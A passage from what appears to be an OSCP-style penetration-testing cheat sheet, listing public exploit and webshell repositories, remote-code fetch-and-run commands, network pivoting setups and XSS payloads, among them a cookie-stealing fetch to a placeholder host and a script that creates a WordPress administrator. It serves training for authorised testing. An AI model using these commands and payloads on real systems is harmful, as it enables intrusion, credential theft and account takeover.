| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Payloads

| Name | URL |
| --- | --- |
| Payload Box | https://github.com/payloadbox |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |

### Wordlists

| Name | URL |
| --- | --- |
| bopscrk | https://github.com/R3nt0n/bopscrk |
| CeWL | https://github.com/digininja/cewl |
| COOK | https://github.com/giteshnxtlvl/cook |
| CUPP | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
| SecLists | https://github.com/danielmiessler/SecLists |
| Username Anarchy | https://github.com/urbanadventurer/username-anarchy |

### Reporting

| Name | URL |
| --- | --- |
| OSCP-Note-Vault | https://github.com/0xsyr0/OSCP-Note-Vault |
| SysReptor | https://github.com/Syslifters/sysreptor |
| SysReptor OffSec Reporting | https://github.com/Syslifters/OffSec-Reporting |
| SysReptor Portal | https://oscp.sysreptor.com/oscp/signup/ |

### Social Media Resources

| Name | URL |
| --- | --- |
| OSCP Guide 01/12 – My Exam Experience | https://www.youtube.com/watch?v=9mrf-WyzkpE&list=PLJnLaWkc9xRgOyupMhNiVFfgvxseWDH5x |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
| HackTricks | https://book.hacktricks.xyz/ |
| HackTricks Local Windows Privilege Escalation Checklist | https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rednode Windows Privilege Escalation | https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/ |
| OSCP Cheat Sheet by xsudoxx | https://github.com/xsudoxx/OSCP |
| OSCP-Tricks-2023 by Rodolfo Marianocy | https://github.com/rodolfomarianocy/OSCP-Tricks-2023 |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/ |

## Commands

### Basics

#### curl

```c
curl -v http://<DOMAIN>                                                        // verbose output
curl -X POST http://<DOMAIN>                                                   // use POST method
curl -X PUT http://<DOMAIN>                                                    // use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
curl --proxy http://127.0.0.1:8080                                             // use proxy
curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
```

#### File Transfer

##### Certutil

```c
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

##### Netcat

```c
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```

##### Impacket

```c
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
copy * \\<LHOST>\<SHARE>
```

##### PowerShell

```c
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

##### Bash only

###### wget version

Paste directly to the shell.

```c
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```c
__wget http://<LHOST>/<FILE>
```

###### curl version

```c
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```c
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

#### FTP

```c
ftp <RHOST>
ftp -A <RHOST>
wget -r ftp://anonymous:anonymous@<RHOST>
```

#### Kerberos

```c
sudo apt-get install krb5-kdc
```

##### Ticket Handling

```c
impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
export KRB5CCNAME=<FILE>.ccache
export KRB5CCNAME='realpath <FILE>.ccache'
```

##### Kerberos related Files

```c
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

##### Ticket Conversion

###### kribi to ccache

```c
base64 -d <USERNAME>.kirbi.b64 > <USERNAME>.kirbi
impacket-ticketConverter <USERNAME>.kirbi <USERNAME>.ccache
export KRB5CCNAME=`realpath <USERNAME>.ccache`
```

###### ccache to kirbi

```c
impacket-ticketConverter <USERNAME>.ccache <USERNAME>.kirbi
base64 -w0 <USERNAME>.kirbi > <USERNAME>.kirbi.base64
```

#### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

##### Download Proxy and Agent

```c
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

##### Prepare Tunnel Interface

```c
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
sudo ip link set ligolo up
```

##### Setup Proxy on Attacker Machine

```c
./proxy -laddr <LHOST>:443 -selfcert
```

##### Setup Agent on Target Machine

```c
./agent -connect <LHOST>:443 -ignore-cert
```

##### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

###### Port Forwarding

```c
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```

#### Linux

##### CentOS

```c
doas -u <USERNAME> /bin/sh
```

##### Environment Variables

```c
export PATH=`pwd`:$PATH
```

##### gcc

```c
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

##### getfacl

```c
getfacl <LOCAL_DIRECTORY>
```

##### iconv

```c
echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

##### vi

```c
:w !sudo tee %    # save file with elevated privileges without exiting
```

##### Windows Command Formatting

```c
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

#### Microsoft Windows

##### dir

```c
dir /a
dir /a:d
dir /a:h
dir flag* /s /p
dir /s /b *.log
```

#### PHP Webserver

```c
sudo php -S 127.0.0.1:80
```

#### Ping

```c
ping -c 1 <RHOST>
ping -n 1 <RHOST>
```

#### Port Forwarding

##### Chisel

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

###### Reverse Pivot

- LHOST < APPLICATION SERVER

###### LHOST

```c
./chisel server -p 9002 -reverse -v
```

###### APPLICATION SERVER

```c
./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
```

###### SOCKS5 / Proxychains Configuration

- LHOST > APPLICATION SERVER > NETWORK

###### LHOST

```c
./chisel server -p 9002 -reverse -v
```

###### APPLICATION SERVER

```c
./chisel client 192.168.50.10:9002 R:socks
```

##### Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

###### Download Proxy and Agent

> https://github.com/nicocha30/ligolo-ng/releases

```c
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

###### Prepare Tunnel Interface

```c
sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
sudo ip link set ligolo up
```

###### Setup Proxy on LHOST

```c
./proxy -laddr 192.168.50.10:443 -selfcert
```

###### Setup Agent on APPLICATION SERVER

```c
./agent -connect 192.168.50.10:443 -ignore-cert
```

###### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
sudo ip r add 172.16.50.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

###### Port Forwarding

- LHOST < APPLICATION SERVER > DATABASE SERVER

```c
[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
```

##### Socat

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > DATABASE SERVER

###### APPLICATION SERVER

```c
ip a
ip r
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
```

###### LHOST

```c
psql -h <RHOST> -p 2342 -U postgres
```

##### SSH Tunneling

###### Local Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

###### APPLICATION SERVER

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh <USERNAME>@192.168.100.10
ip a
ip r
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
```

###### LHOST

```c
smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

###### Dynamic Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

###### APPLICATION SERVER

```c
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
```

###### LHOST

```c
sudo ss -tulpn
tail /etc/proxychains4.conf
socks5 192.168.50.10 9999
proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

###### Remote Port Forwarding

| System | IP address |
| --- | --- |
| LHOST | 192.168.50.10 |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER | 10.10.100.20 |
| WINDOWS HOST | 172.16.50.10 |

- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

###### LHOST

```c
sudo systemctl start ssh
sudo ss -tulpn
```

###### APPLICATION SERVER

```c
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
```

###### LHOST

```c
psql -h 127.0.0.1 -p 2345 -U postgres
```

###### Remote Dynamic Port Forwarding

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST < FIREWALL < APPLICATION SERVER > NETWORK

###### APPLICATION SERVER

```c
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 <USERNAME>@192.168.50.10
```

###### LHOST

```c
sudo ss -tulpn
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

##### sshuttle

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

- LHOST > APPLICATION SERVER > NETWORK

###### APPLICATION SERVER

```c
socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

###### LHOST

```c
sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

##### ssh.exe

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK

###### LHOST

```c
sudo systemctl start ssh
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

###### WINDOWS JUMP SERVER

```c
where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
```

###### LHOST

```c
ss -tulpn
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
proxychains psql -h 10.10.100.20 -U postgres
```

##### Plink

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER

###### LHOST

```c
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

###### WINDOWS JUMP SERVER

```c
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

###### LHOST

```c
ss -tulpn
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

##### Netsh

| System              | IP address     |
| ------------------- | -------------- |
| LHOST               | 192.168.50.10  |
| APPLICATION SERVER  | 192.168.100.10 |
| WINDOWS JUMP SERVER | 192.168.100.20 |
| DATABASE SERVER     | 10.10.100.20   |
| WINDOWS HOST        | 172.16.50.10   |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER

###### LHOST

```c
xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

###### WINDOWS JUMP SERVER

```c
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
netstat -anp TCP | findstr "2222"
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

###### LHOST

```c
sudo nmap -sS 192.168.50.10 -Pn -n -p2222
ssh database_admin@192.168.50.10 -p2222
```

###### WINDOWS JUMP SERVER

```c
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

#### Python Webserver

```c
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
```

#### RDP

```c
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
rdesktop <RHOST>
```

#### showmount

```c
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
chown root:root sid-shell; chmod +s sid-shell
```

#### SMB

```c
mount.cifs //<RHOST>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
```

#### smbclient

```c
smbclient -L \\<RHOST>\ -N
smbclient -L //<RHOST>/ -N
smbclient -L ////<RHOST>/ -N
smbclient -L //<RHOST>// -U <USERNAME>%<PASSWORD>
smbclient -U "<USERNAME>" -L \\\\<RHOST>\\
smbclient //<RHOST>/<SHARE>
smbclient //<RHOST>/<SHARE> -U <USERNAME>
smbclient //<RHOST>/SYSVOL -U <USERNAME>%<PASSWORD>
smbclient "\\\\<RHOST>\<SHARE>"
smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<RHOST>/<SHARE>
```

##### Download multiple files at once

```c
mask""
recurse ON
prompt OFF
mget *
```

#### SSH

```c
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### Time and Date

##### Get the Server Time

```c
sudo nmap -sU -p 123 --script ntp-info <RHOST>
```

##### Stop virtualbox-guest-utils to stop syncing Time

```c
sudo /etc/init.d/virtualbox-guest-utils stop
```

##### Stop systemd-timesyncd to sync Time manually

```c
sudo systemctl stop systemd-timesyncd
```

##### Disable automatic Sync

```c
sudo systemctl disable --now chronyd
```

##### Options to set the Date and Time

```c
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo net time \\<RHOST> /set /y
sudo ntpdate <RHOST>
sudo ntpdate -s <RHOST>
sudo ntpdate -b -u <RHOST>
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
```

##### Keep in Sync with a Server

```c
while [ 1 ]; do sudo ntpdate <RHOST>;done
```

#### Tmux

```c
ctrl b + w    # show windows
ctrl + "      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
```

Copy & Paste
```c
:setw -g mode-keys vi
ctrl b + [
space
enter
ctrl b + ]
```

Search
```c
ctrl b + [    # enter copy
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
```

Logging
```c
ctrl b
shift + P    # start / stop
```

Save Output
```c
ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer <FILE>.txt
```

#### Upgrading Shells

```c
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

or

```c
Ctrl + z
stty -a
stty raw -echo;fg
Enter
Enter
stty rows 37 cols 123
export TERM=xterm-256color
bash
```

Alternatively:

```c
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Oneliner

```c
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### Fixing Staircase Effect

```c
env reset
```

or

```c
stty onlcr
```

#### VirtualBox

```c
sudo pkill VBoxClient && VBoxClient --clipboard
```

#### virtualenv

```c
sudo apt-get install virtualenv
virtualenv -p python2.7 venv
. venv/bin/activate
```

```c
python.exe -m pip install virtualenv
python.exe -m virtualenv venv
venv\Scripts\activate
```

### Information Gathering

#### memcached

>  https://github.com/pd4d10/memcached-cli

```c
memcrashed / 11211/UDP

npm install -g memcached-cli
memcached-cli <USERNAME>:<PASSWORD>@<RHOST>:11211
echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

sudo nmap <RHOST> -p 11211 -sU -sS --script memcached-info

stats items
stats cachedump 1 0
get link
get file
get user
get passwd
get account
get username
get password
```

#### NetBIOS

```c
nbtscan <RHOST>
nmblookup -A <RHOST>
```

#### Nmap

```c
sudo nmap -A -T4 -sC -sV -p- <RHOST>
sudo nmap -sV -sU <RHOST>
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

#### Port Scanning

```c
for p in {1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
```

```c
export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

#### snmpwalk

```c
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

### Web Application Analysis

#### Burp Suite

```c
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

#### Set Proxy Environment Variables

```c
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
```

#### cadaver

```c
cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

```c
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

#### Cross-Site Scripting (XSS)

```c
<sCrIpt>alert(1)</ScRipt>
<script>alert('XSS');</script>
<script>alert(document.cookies)</script>
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>
<script>user.changeEmail('user@domain');</script>
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>
<img src='http://<RHOST>'/>
```

##### XSS client-Side Attack

###### Request Example

```c
<a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000"">foobar!</a>
```

###### Get nonce

```c
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

###### Update Payload Script

```c
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

###### Compress Payload Script

> https://jscompress.com/

```c
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

##### Encoding Function

```c
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)
```

###### Encoded Payload

```c
